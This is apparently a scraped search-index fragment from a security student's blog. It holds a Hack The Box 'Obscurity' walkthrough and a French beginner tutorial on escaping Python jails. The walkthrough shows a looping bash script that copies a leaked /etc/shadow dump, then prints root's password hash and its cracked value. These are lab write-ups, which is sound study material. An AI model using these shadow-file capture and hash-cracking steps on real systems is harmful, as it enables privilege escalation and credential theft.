We got a bunch of files here, some are pretty interesting, especially the Python script.\nBy examining it, we understand that Robert uses a custom password manager, stores it\u0026rsquo;s \u0026ldquo;encrypted\u0026rdquo; password in a file, and tested it\u0026rsquo;s encryption passphrase on a dummy text file.\nFirst thing I did was to BF it\u0026rsquo;s password using the famous rockyou. But it was unsuccessfull, I managed to get something close to it\u0026rsquo;s password, but not the actual password.\nAfter thinking about the encryption and decryption algorithms, I managed to get the real password.\nTo use the Python script : python SuperSecureCrypt.py -i infile -k key -o outfile will \u0026ldquo;encypt\u0026rdquo; the content of infile with key into outfile. To decrypt we have to use the -d option.\nAs the encryption and decryption where very simple :\n1def encrypt(text, key): 2 for x in text: 3 newChr = chr( (ord(x) + ord(keyChr)) % 255 ) 4 encrypted += newCrh 5 6def decrypt(text, key): 7 for x in text: 8 newChr = chr( (ord(x) - ord(keyChr)) % 255 ) 9 decrypted += newChr The easiest way to get the password was : python SuperSecureCrypt.py -d -i out.txt -k \u0026quot;$(cat check.txt)\u0026quot; -o pass.txt\nThe encryption password was alexandrovich.\npython SuperSecureCrypt.py -d -i passwordreminder.txt -k alexandrovich -o robert.txt\nRobert\u0026rsquo;s password was SecThruObsFTW, we can SSH as him and get the user.txt content.\nRoot # We now need to go root. As robert :\n\u0026gt; sudo -l User robert may run the following commands on obscure: (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py So yeah, we know where to start. We now need to know how to exploit this BetterSSH.py script.\nBy reading the first lines, we know that it reads the /etc/shadow file, and write it\u0026rsquo;s content into a file somewhere in /tmp/SSH/. The script prompts for a username and password, if the password\u0026rsquo;s hash does corresponds to the shadow one, it gives a shell as this user.\nI started to find a fancy way to monitor the content of the /tmp/SSH/ folder, but a simple bash script can do anything :\n1#!/bin/bash 2while true; do 3 cat /tmp/SSH/* \u0026gt;\u0026gt; /tmp/.ninja 4done I launched the script in background, launched the BetterSSH script too, and read the content of my /tmp/.ninja file. We get most of the users\u0026rsquo; hashes separated by line, but only one matters to us. Root\u0026rsquo;s hash was $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1.\nUsing john the ripper on the hash, we get root\u0026rsquo;s password : mercedes. I could have SSH back as root, but there is already a tool for us : sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py, entered root for user, and mercedes for password, we now have a shell as root.\n","date":"12 April 2020","permalink":"/posts/htb-obscurity/","section":"Posts","summary":"Obscurity is my first medium box so I was very happy when I got that root.","title":"📦 HTB - Obscurity"},{"content":"Yeah, I wanted to do one of those for a long time 😁\nSo, we have to stay at home for the moment, I decided to make a \u0026ldquo;walkthrough\u0026rdquo; about something I used sometimes and I couldn\u0026rsquo;t remember all the commands.

Il s\u0026rsquo;agit le plus souvent d\u0026rsquo;un environnement Python 🐍 restreint, c\u0026rsquo;est-à-dire que (comme pour les autres types de \u0026lsquo;jails\u0026rsquo;) certaines fonctions, classes ont été supprimées, ou sont filtrées lors du traitement de l\u0026rsquo;input utilisateur pour bloquer l\u0026rsquo;attaquant.\nCes environnements restreints sont présents lors de CTFs mais c\u0026rsquo;est une catégorie qui nécessite un peu de connaissances avant de s\u0026rsquo;y lancer, mais sont aussi utilisés dans des milieux professionnels afin d\u0026rsquo;éviter de donner l\u0026rsquo;accès à tout le système si un attaquant arrive à entrer sur un serveur SSH par exemple.\nUn peu de pratique # Avec l\u0026rsquo;aide d\u0026rsquo;un cobaye pour le test, qui se reconnaîtra, j\u0026rsquo;ai réalisé quelques pyjails qui permettent de mieux appréhender le langage Python, mais aussi de développer une méthodologie de résolution.\nNous allons voir comment résoudre une jail des plus basiques ensemble, ensuite vous serez libres d’approfondir vos connaissances avec d\u0026rsquo;autres jails que j\u0026rsquo;ai réalisé, et si le cœur vous en dit vous pouvez même tenter de flag les jails sur Root-Me 😊.\nAvant de commencer # Vérifiez bien d\u0026rsquo;avoir Python 3 d\u0026rsquo;installé sur votre machine, puis téléchargez cette archive zip qui contient l\u0026rsquo;environnement de travail adéquat pour résoudre toutes les jails. Cette archive contient un fichier flag.txt qui est lu par toutes les jails lorsque vous avez réussi le challenge, vous devez alors laisser les fichiers jail*.py dans le même dossier.\nPour démarrer # Au préalable, décompressez le fichier zip :\n1mkdir jails; unzip jails.zip -d jails/; cd jails Pour lancer une jail de votre choix vous avez simplement à l\u0026rsquo;exécuter avec Python :\n1python3 jail1.py Note : les jails sont classées par difficulté croissante, on a alors jail1 plus simple que jail3\nAu boulot ! # Passons à la réalisation de la jail 1. Le but est de finir le challenge sans lire le code source du fichier, mais si vous êtes bloqué plusieurs heures n\u0026rsquo;hésitez pas à y jeter un coup d’œil rapide.\nPremier lançement # Pour nous échapper de cette prison nous allons devoir étudier comment fonctionne le programme. On lance la jail1 :\nTests # Effectuons quelques tests afin de déterminer ce que l\u0026rsquo;on peut faire dans cet environement restreint :\nOn peut voir que les opérations usuelles (calculs, affichage, variables\u0026hellip;) sont autorisées, essayons sd\u0026rsquo;appeler la méthode flag() afin de sortir :\nPas de chance, rien ne se passe, pourtant on voit bien que flag est une fonction, on devrait être en mesure de l\u0026rsquo;apeller, comme pour print() par exemple.\nIl doit se passer quelque chose entre le moment où l\u0026rsquo;on entre la commande et l\u0026rsquo;exécution de cette dernière 😔.\nEssayons de déterminer le problème :\nRésolution # On comprend alors que l\u0026rsquo;entrée utilisateur est filtrée : si la chaîne \u0026quot;flag()\u0026quot; est présente, elle est supprimée.

C\u0026rsquo;est le même principe, sauf que c\u0026rsquo;est pas dans un rêve mais un shell Python.\nEn effet, écrire fflag()lag(), ou flag(flag()), ou toute autre variation permet de contourner le filtre. 🎉🎉\n","date":"9 March 2019","permalink":"/posts/les-pyjails-pour-les-d%C3%A9butants/","section":"Posts","summary":"Introduction # Tout d\u0026rsquo;abord qu\u0026rsquo;est-ce qu\u0026rsquo;une \u0026lsquo;pyjail\u0026rsquo; ?","title":"Les pyjails pour les débutants"},{"content":"","date":"9 March 2019","permalink":"/tags/python/","section":"Tags","summary":"","title":"python"},{"content":" French engineering student in cybersecurity, I like the web, reverse, crafting ELF and assembly.\nI participate in CTFs on my own or with friends.
